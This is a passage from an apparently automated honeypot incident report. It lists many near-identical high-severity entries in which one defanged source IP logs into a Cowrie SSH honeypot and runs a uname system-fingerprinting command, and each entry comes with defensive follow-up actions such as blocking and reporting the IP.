| `2026-09-05 18:02:46` | `cowrie.login.success` |
| `2026-09-05 18:02:47` | `cowrie.session.params` |
| `2026-09-05 18:02:47` | `cowrie.command.input` |
| `2026-09-05 18:02:47` | `cowrie.log.closed` |
| `2026-09-05 18:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a854ac6ed2f3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:03 |
| **Last Seen** | 2026-09-05 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:03:00` | `cowrie.session.connect` |
| `2026-09-05 18:03:00` | `cowrie.client.version` |
| `2026-09-05 18:03:00` | `cowrie.client.kex` |
| `2026-09-05 18:03:00` | `cowrie.login.success` |
| `2026-09-05 18:03:01` | `cowrie.session.params` |
| `2026-09-05 18:03:01` | `cowrie.command.input` |
| `2026-09-05 18:03:01` | `cowrie.log.closed` |
| `2026-09-05 18:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557ec4fb2f65

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:03 |
| **Last Seen** | 2026-09-05 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:03:14` | `cowrie.session.connect` |
| `2026-09-05 18:03:14` | `cowrie.client.version` |
| `2026-09-05 18:03:14` | `cowrie.client.kex` |
| `2026-09-05 18:03:14` | `cowrie.login.success` |
| `2026-09-05 18:03:15` | `cowrie.session.params` |
| `2026-09-05 18:03:15` | `cowrie.command.input` |
| `2026-09-05 18:03:15` | `cowrie.log.closed` |
| `2026-09-05 18:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e08566e3c2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:03 |
| **Last Seen** | 2026-09-05 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:03:29` | `cowrie.session.connect` |
| `2026-09-05 18:03:29` | `cowrie.client.version` |
| `2026-09-05 18:03:29` | `cowrie.client.kex` |
| `2026-09-05 18:03:29` | `cowrie.login.success` |
| `2026-09-05 18:03:29` | `cowrie.session.params` |
| `2026-09-05 18:03:29` | `cowrie.command.input` |
| `2026-09-05 18:03:29` | `cowrie.log.closed` |
| `2026-09-05 18:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e019eef7f4b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:03 |
| **Last Seen** | 2026-09-05 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:03:43` | `cowrie.session.connect` |
| `2026-09-05 18:03:43` | `cowrie.client.version` |
| `2026-09-05 18:03:43` | `cowrie.client.kex` |
| `2026-09-05 18:03:43` | `cowrie.login.success` |
| `2026-09-05 18:03:44` | `cowrie.session.params` |
| `2026-09-05 18:03:44` | `cowrie.command.input` |
| `2026-09-05 18:03:44` | `cowrie.log.closed` |
| `2026-09-05 18:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea52a39add92

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:03 |
| **Last Seen** | 2026-09-05 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:03:58` | `cowrie.session.connect` |
| `2026-09-05 18:03:58` | `cowrie.client.version` |
| `2026-09-05 18:03:58` | `cowrie.client.kex` |
| `2026-09-05 18:03:58` | `cowrie.login.success` |
| `2026-09-05 18:03:58` | `cowrie.session.params` |
| `2026-09-05 18:03:58` | `cowrie.command.input` |
| `2026-09-05 18:03:58` | `cowrie.log.closed` |
| `2026-09-05 18:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0795c0bbdac

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:04 |
| **Last Seen** | 2026-09-05 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:04:12` | `cowrie.session.connect` |
| `2026-09-05 18:04:12` | `cowrie.client.version` |
| `2026-09-05 18:04:12` | `cowrie.client.kex` |
| `2026-09-05 18:04:13` | `cowrie.login.success` |
| `2026-09-05 18:04:13` | `cowrie.session.params` |
| `2026-09-05 18:04:13` | `cowrie.command.input` |
| `2026-09-05 18:04:13` | `cowrie.log.closed` |
| `2026-09-05 18:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f136ef3529c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:04 |
| **Last Seen** | 2026-09-05 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:04:27` | `cowrie.session.connect` |
| `2026-09-05 18:04:27` | `cowrie.client.version` |
| `2026-09-05 18:04:27` | `cowrie.client.kex` |
| `2026-09-05 18:04:27` | `cowrie.login.success` |
| `2026-09-05 18:04:28` | `cowrie.session.params` |
| `2026-09-05 18:04:28` | `cowrie.command.input` |
| `2026-09-05 18:04:28` | `cowrie.log.closed` |
| `2026-09-05 18:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964b710a68e5

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:04 |
| **Last Seen** | 2026-09-05 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:04:42` | `cowrie.session.connect` |
| `2026-09-05 18:04:42` | `cowrie.client.version` |
| `2026-09-05 18:04:42` | `cowrie.client.kex` |
| `2026-09-05 18:04:42` | `cowrie.login.success` |
| `2026-09-05 18:04:42` | `cowrie.session.params` |
| `2026-09-05 18:04:42` | `cowrie.command.input` |
| `2026-09-05 18:04:42` | `cowrie.log.closed` |
| `2026-09-05 18:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b6c9ce75d25

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:04 |
| **Last Seen** | 2026-09-05 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:04:57` | `cowrie.session.connect` |
| `2026-09-05 18:04:57` | `cowrie.client.version` |
| `2026-09-05 18:04:57` | `cowrie.client.kex` |
| `2026-09-05 18:04:57` | `cowrie.login.success` |
| `2026-09-05 18:04:57` | `cowrie.session.params` |
| `2026-09-05 18:04:57` | `cowrie.command.input` |
| `2026-09-05 18:04:57` | `cowrie.log.closed` |
| `2026-09-05 18:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3304fd8af3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:05 |
| **Last Seen** | 2026-09-05 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:05:11` | `cowrie.session.connect` |
| `2026-09-05 18:05:11` | `cowrie.client.version` |
| `2026-09-05 18:05:11` | `cowrie.client.kex` |
| `2026-09-05 18:05:11` | `cowrie.login.success` |
| `2026-09-05 18:05:12` | `cowrie.session.params` |
| `2026-09-05 18:05:12` | `cowrie.command.input` |
| `2026-09-05 18:05:12` | `cowrie.log.closed` |
| `2026-09-05 18:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a890060e2972

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:05 |
| **Last Seen** | 2026-09-05 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:05:26` | `cowrie.session.connect` |
| `2026-09-05 18:05:26` | `cowrie.client.version` |
| `2026-09-05 18:05:26` | `cowrie.client.kex` |
| `2026-09-05 18:05:26` | `cowrie.login.success` |
| `2026-09-05 18:05:27` | `cowrie.session.params` |
| `2026-09-05 18:05:27` | `cowrie.command.input` |
| `2026-09-05 18:05:27` | `cowrie.log.closed` |
| `2026-09-05 18:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4fe44de64d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:05 |
| **Last Seen** | 2026-09-05 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:05:41` | `cowrie.session.connect` |
| `2026-09-05 18:05:41` | `cowrie.client.version` |
| `2026-09-05 18:05:41` | `cowrie.client.kex` |
| `2026-09-05 18:05:41` | `cowrie.login.success` |
| `2026-09-05 18:05:42` | `cowrie.session.params` |
| `2026-09-05 18:05:42` | `cowrie.command.input` |
| `2026-09-05 18:05:42` | `cowrie.log.closed` |
| `2026-09-05 18:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37ca8f61dac6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:05 |
| **Last Seen** | 2026-09-05 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:05:56` | `cowrie.session.connect` |
| `2026-09-05 18:05:56` | `cowrie.client.version` |
| `2026-09-05 18:05:56` | `cowrie.client.kex` |
| `2026-09-05 18:05:56` | `cowrie.login.success` |
| `2026-09-05 18:05:57` | `cowrie.session.params` |
| `2026-09-05 18:05:57` | `cowrie.command.input` |
| `2026-09-05 18:05:57` | `cowrie.log.closed` |
| `2026-09-05 18:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6024edec71

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:06 |
| **Last Seen** | 2026-09-05 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:06:11` | `cowrie.session.connect` |
| `2026-09-05 18:06:11` | `cowrie.client.version` |
| `2026-09-05 18:06:11` | `cowrie.client.kex` |
| `2026-09-05 18:06:11` | `cowrie.login.success` |
| `2026-09-05 18:06:12` | `cowrie.session.params` |
| `2026-09-05 18:06:12` | `cowrie.command.input` |
| `2026-09-05 18:06:12` | `cowrie.log.closed` |
| `2026-09-05 18:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00f108016d2

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:06 |
| **Last Seen** | 2026-09-05 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:06:26` | `cowrie.session.connect` |
| `2026-09-05 18:06:26` | `cowrie.client.version` |
| `2026-09-05 18:06:26` | `cowrie.client.kex` |
| `2026-09-05 18:06:26` | `cowrie.login.success` |
| `2026-09-05 18:06:27` | `cowrie.session.params` |
| `2026-09-05 18:06:27` | `cowrie.command.input` |
| `2026-09-05 18:06:27` | `cowrie.log.closed` |
| `2026-09-05 18:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293c0960a0db

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:06 |
| **Last Seen** | 2026-09-05 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:06:41` | `cowrie.session.connect` |
| `2026-09-05 18:06:41` | `cowrie.client.version` |
| `2026-09-05 18:06:41` | `cowrie.client.kex` |
| `2026-09-05 18:06:41` | `cowrie.login.success` |
| `2026-09-05 18:06:42` | `cowrie.session.params` |
| `2026-09-05 18:06:42` | `cowrie.command.input` |
| `2026-09-05 18:06:42` | `cowrie.log.closed` |
| `2026-09-05 18:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99112a57dd90

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:06 |
| **Last Seen** | 2026-09-05 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:06:56` | `cowrie.session.connect` |
| `2026-09-05 18:06:56` | `cowrie.client.version` |
| `2026-09-05 18:06:56` | `cowrie.client.kex` |
| `2026-09-05 18:06:56` | `cowrie.login.success` |
| `2026-09-05 18:06:57` | `cowrie.session.params` |
| `2026-09-05 18:06:57` | `cowrie.command.input` |
| `2026-09-05 18:06:57` | `cowrie.log.closed` |
| `2026-09-05 18:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c79d41786cd0

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:07 |
| **Last Seen** | 2026-09-05 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:07:12` | `cowrie.session.connect` |
| `2026-09-05 18:07:12` | `cowrie.client.version` |
| `2026-09-05 18:07:12` | `cowrie.client.kex` |
| `2026-09-05 18:07:12` | `cowrie.login.success` |
| `2026-09-05 18:07:12` | `cowrie.session.params` |
| `2026-09-05 18:07:12` | `cowrie.command.input` |
| `2026-09-05 18:07:12` | `cowrie.log.closed` |
| `2026-09-05 18:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c77c2c5de86

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:07 |
| **Last Seen** | 2026-09-05 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:07:26` | `cowrie.session.connect` |
| `2026-09-05 18:07:26` | `cowrie.client.version` |
| `2026-09-05 18:07:26` | `cowrie.client.kex` |
| `2026-09-05 18:07:27` | `cowrie.login.success` |
| `2026-09-05 18:07:27` | `cowrie.session.params` |
| `2026-09-05 18:07:27` | `cowrie.command.input` |
| `2026-09-05 18:07:27` | `cowrie.log.closed` |
| `2026-09-05 18:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc7053c5fbb9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:07 |
| **Last Seen** | 2026-09-05 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:07:41` | `cowrie.session.connect` |
| `2026-09-05 18:07:41` | `cowrie.client.version` |
| `2026-09-05 18:07:41` | `cowrie.client.kex` |
| `2026-09-05 18:07:41` | `cowrie.login.success` |
| `2026-09-05 18:07:42` | `cowrie.session.params` |
| `2026-09-05 18:07:42` | `cowrie.command.input` |
| `2026-09-05 18:07:42` | `cowrie.log.closed` |
| `2026-09-05 18:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb0e597ce1c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:07 |
| **Last Seen** | 2026-09-05 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:07:56` | `cowrie.session.connect` |
| `2026-09-05 18:07:56` | `cowrie.client.version` |
| `2026-09-05 18:07:56` | `cowrie.client.kex` |
| `2026-09-05 18:07:56` | `cowrie.login.success` |
| `2026-09-05 18:07:57` | `cowrie.session.params` |
| `2026-09-05 18:07:57` | `cowrie.command.input` |
| `2026-09-05 18:07:57` | `cowrie.log.closed` |
| `2026-09-05 18:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9fd2ac19f0

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:08 |
| **Last Seen** | 2026-09-05 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:08:11` | `cowrie.session.connect` |
| `2026-09-05 18:08:11` | `cowrie.client.version` |
| `2026-09-05 18:08:11` | `cowrie.client.kex` |
| `2026-09-05 18:08:11` | `cowrie.login.success` |
| `2026-09-05 18:08:11` | `cowrie.session.params` |
| `2026-09-05 18:08:11` | `cowrie.command.input` |
| `2026-09-05 18:08:11` | `cowrie.log.closed` |
| `2026-09-05 18:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d2c5443c12f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:08 |
| **Last Seen** | 2026-09-05 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:08:25` | `cowrie.session.connect` |
| `2026-09-05 18:08:25` | `cowrie.client.version` |
| `2026-09-05 18:08:25` | `cowrie.client.kex` |
| `2026-09-05 18:08:25` | `cowrie.login.success` |
| `2026-09-05 18:08:26` | `cowrie.session.params` |
| `2026-09-05 18:08:26` | `cowrie.command.input` |
| `2026-09-05 18:08:26` | `cowrie.log.closed` |
| `2026-09-05 18:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3951ba8d3cf7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:08 |
| **Last Seen** | 2026-09-05 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:08:40` | `cowrie.session.connect` |
| `2026-09-05 18:08:40` | `cowrie.client.version` |
| `2026-09-05 18:08:40` | `cowrie.client.kex` |
| `2026-09-05 18:08:40` | `cowrie.login.success` |
| `2026-09-05 18:08:41` | `cowrie.session.params` |
| `2026-09-05 18:08:41` | `cowrie.command.input` |
| `2026-09-05 18:08:41` | `cowrie.log.closed` |
| `2026-09-05 18:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d250011d1c7

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:08 |
| **Last Seen** | 2026-09-05 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:08:55` | `cowrie.session.connect` |
| `2026-09-05 18:08:55` | `cowrie.client.version` |
| `2026-09-05 18:08:55` | `cowrie.client.kex` |
| `2026-09-05 18:08:55` | `cowrie.login.success` |
| `2026-09-05 18:08:56` | `cowrie.session.params` |
| `2026-09-05 18:08:56` | `cowrie.command.input` |
| `2026-09-05 18:08:56` | `cowrie.log.closed` |
| `2026-09-05 18:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
